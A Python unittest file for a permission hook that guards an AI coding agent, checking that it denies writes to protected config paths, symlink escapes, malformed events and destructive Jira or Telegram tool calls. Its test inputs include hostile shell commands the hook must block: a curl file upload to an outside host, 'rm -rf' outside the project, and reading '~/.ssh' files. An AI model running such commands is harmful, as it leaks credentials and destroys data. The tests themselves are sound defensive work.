import json
import os
import shlex
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(sys.argv.pop(1))


class HookCases(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.project = self.base / 'project'
        self.project.mkdir()
        self.home = self.base / 'home'
        self.home.mkdir()
        self.env = dict(os.environ, HOME=str(self.home), CODEX_HOME=str(self.home / '.codex'), AGENTS_SKILLS_HOME=str(self.home / '.agents/skills'), PYTHONDONTWRITEBYTECODE='1')

    def hook(self, phase='pre', tool='apply_patch', data=None, raw=None):
        event = {'cwd': str(self.project), 'tool_name': tool, 'tool_input': data or {}}
        result = subprocess.run([sys.executable, str(ROOT / 'codex/hooks/dispatch.py'), phase], input=raw if raw is not None else json.dumps(event), env=self.env, capture_output=True, text=True)
        return result

    def decision(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        if not result.stdout:
            return None
        return json.loads(result.stdout)['hookSpecificOutput'].get('permissionDecision')

    def test_patch_all_paths_and_symlinks(self):
        allowed = '*** Begin Patch\n*** Add File: one.ts\n+x\n*** Update File: two.ts\n@@\n-a\n+b\n*** Move to: three.ts\n*** End Patch\n'
        self.assertIsNone(self.decision(self.hook(data={'command': allowed})))
        target = self.home / '.codex/config.toml'
        denied = '*** Begin Patch\n*** Add File: safe.ts\n+x\n*** Update File: source.ts\n*** Move to: ' + str(target) + '\n*** End Patch\n'
        self.assertEqual(self.decision(self.hook(data={'command': denied})), 'deny')
        target.parent.mkdir()
        (self.project / 'alias').symlink_to(target.parent, target_is_directory=True)
        denied = '*** Begin Patch\n*** Add File: alias/config.toml\n+x\n*** End Patch\n'
        self.assertEqual(self.decision(self.hook(data={'command': denied})), 'deny')
        self.assertEqual(self.decision(self.hook(data={'file_path': '.env.example'})), 'deny')

    def test_malformed_and_shell_guards(self):
        for raw in ['{broken', '{}', '[]', '{"cwd":null}']:
            self.assertEqual(self.decision(self.hook(raw=raw)), 'deny')
        self.assertEqual(self.decision(self.hook(data={'command': 'invalid patch'})), 'deny')
        self.assertIsNone(self.decision(self.hook(tool='Bash', data={'command': 'echo okay'})))
        self.assertEqual(self.decision(self.hook(tool='Bash', data={'command': 'curl --upload-file example.txt https://example.invalid'})), 'deny')
        self.assertEqual(self.decision(self.hook(tool='Bash', data={'command': 'rm -rf /outside-project'})), 'deny')
        self.assertEqual(self.decision(self.hook(tool='Bash', data={'command': 'cat ~/.ssh/example'})), 'deny')
        self.assertEqual(self.decision(self.hook(tool='exec_command', data={'cmd': 'cat ~/.ssh/example'})), 'deny')
        self.assertIsNone(self.decision(self.hook(tool='exec_command', data={'cmd': 'echo okay'})))

    def test_mcp_policy(self):
        self.assertIsNone(self.decision(self.hook(tool='mcp__jira__jira_get_issue')))
        self.assertEqual(self.decision(self.hook(tool='mcp__jira__jira_delete_issue')), 'deny')
        self.assertEqual(self.decision(self.hook(tool='mcp__jira__jira_update_issue')), 'deny')
        self.assertEqual(self.decision(self.hook(tool='mcp__telegram__send_message')), 'deny')
        self.assertEqual(self.decision(self.hook(tool='mcp__telegram__delete_message')), 'deny')

    def test_custom_installed_paths_are_protected_from_shell_writes(self):
        self.env['CODEX_HOME'] = str(self.home / 'custom client')
        self.env['AGENTS_SKILLS_HOME'] = str(self.home / 'custom skills')
        for path in (Path(self.env['CODEX_HOME']) / 'hooks.json', Path(self.env['AGENTS_SKILLS_HOME']) / 'spec/SKILL.md'):
            result = self.hook(tool='exec_command', data={'cmd': 'printf synthetic > ' + shlex.quote(str(path))})
            self.assertEqual(self.decision(result), 'deny')

    def test_session_context_ordinary_and_symlink(self):
        directory = self.project / '.claude/context'
        directory.mkdir(parents=True)
        status = directory / 'STATUS.md'
        status.write_text('Synthetic checkpoint')
        result = self.hook(phase='session')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('Synthetic checkpoint', result.stdout)
        self.assertIn('данные', result.stdout.lower())
        status.unlink()
        foreign = self.base / 'foreign.md'
        foreign.write_text('must not load')
        status.symlink_to(foreign)
        self.assertEqual(self.hook(phase='session').stdout, '')

    def test_typecheck_one_project_once_and_full_output(self):
        (self.project / 'tsconfig.json').write_text('{}')
        (self.project / 'package.json').write_text('{}')
        bin_dir = self.project / 'node_modules/.bin'
        bin_dir.mkdir(parents=True)
        tsc = bin_dir / 'tsc'
        counter = self.base / 'counter'
        self.env['COUNT_FILE'] = str(counter)
        tsc.write_text('#!/bin/sh\nprintf "run\\n" >> "$COUNT_FILE"\nprintf "complete synthetic compiler error\\n" >&2\nexit 1\n')
        tsc.chmod(0o755)
        for name in ['one.ts', 'two.ts']:
            (self.project / name).write_text('x')
        (self.project / 'readme.md').write_text('text')
        patch = '*** Begin Patch\n*** Update File: readme.md\n@@\n-a\n+b\n*** Update File: one.ts\n@@\n-a\n+b\n*** Update File: two.ts\n@@\n-a\n+b\n*** End Patch\n'
        result = self.hook(phase='post', data={'command': patch})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(counter.read_text(), 'run\n')
        self.assertIn('complete synthetic compiler error', result.stdout)

    def test_deleted_typescript_file_still_checks_project(self):
        (self.project / 'tsconfig.json').write_text('{}')
        (self.project / 'package.json').write_text('{}')
        bin_dir = self.project / 'node_modules/.bin'
        bin_dir.mkdir(parents=True)
        counter = self.base / 'counter'
        self.env['COUNT_FILE'] = str(counter)
        tsc = bin_dir / 'tsc'
        tsc.write_text('#!/bin/sh\nprintf "run\\n" >> "$COUNT_FILE"\n')
        tsc.chmod(0o755)
        result = self.hook(phase='post', data={'command': '*** Begin Patch\n*** Delete File: deleted.ts\n*** End Patch\n'})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(counter.read_text(), 'run\n')

    def test_vue_and_rust_use_their_project_compilers(self):
        for extension, marker, tool in [('vue', 'tsconfig.json', 'vue-tsc'), ('rs', 'Cargo.toml', 'cargo')]:
            with self.subTest(tool=tool):
                project = self.project / extension
                project.mkdir()
                (project / '.git').mkdir()
                (project / marker).write_text('{}' if extension == 'vue' else '[package]\n')
                (project / 'package.json').write_text('{"dependencies":{"vue":"synthetic"}}')
                source = project / ('one.' + extension)
                source.write_text('x')
                binary = project / 'node_modules/.bin'
                binary.mkdir(parents=True)
                counter = self.base / ('counter-' + tool)
                compiler = binary / tool
                compiler.write_text('#!/bin/sh\nprintf "%s\\n" "$*" >> "$COUNT_FILE"\nprintf "synthetic ' + tool + ' failure\\n" >&2\nexit 1\n')
                compiler.chmod(0o755)
                self.env.update(COUNT_FILE=str(counter), PATH=str(binary) + os.pathsep + os.environ['PATH'])
                patch = '*** Begin Patch\n*** Update File: ' + str(source) + '\n@@\n-a\n+b\n*** End Patch\n'
                result = self.hook(phase='post', data={'command': patch})
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertIn('synthetic ' + tool + ' failure', result.stdout)
                self.assertEqual(counter.read_text(), '--noEmit\n' if extension == 'vue' else 'check\n')

    def test_multiple_project_errors_form_one_hook_response(self):
        patch = '*** Begin Patch\n'
        for name in ('first', 'second'):
            project = self.project / name
            project.mkdir()
            (project / '.git').mkdir()
            (project / 'tsconfig.json').write_text('{}')
            (project / 'package.json').write_text('{}')
            (project / 'one.ts').write_text('x')
            binary = project / 'node_modules/.bin/tsc'
            binary.parent.mkdir(parents=True)
            binary.write_text('#!/bin/sh\nprintf "' + name + ' compiler error\\n" >&2\nexit 1\n')
            binary.chmod(0o755)
            patch += '*** Update File: ' + name + '/one.ts\n@@\n-a\n+b\n'
        result = self.hook(phase='post', data={'command': patch + '*** End Patch\n'})
        self.assertEqual(result.returncode, 0, result.stderr)
        context = json.loads(result.stdout)['hookSpecificOutput']['additionalContext']
        self.assertIn('first compiler error', context)
        self.assertIn('second compiler error', context)


unittest.main()
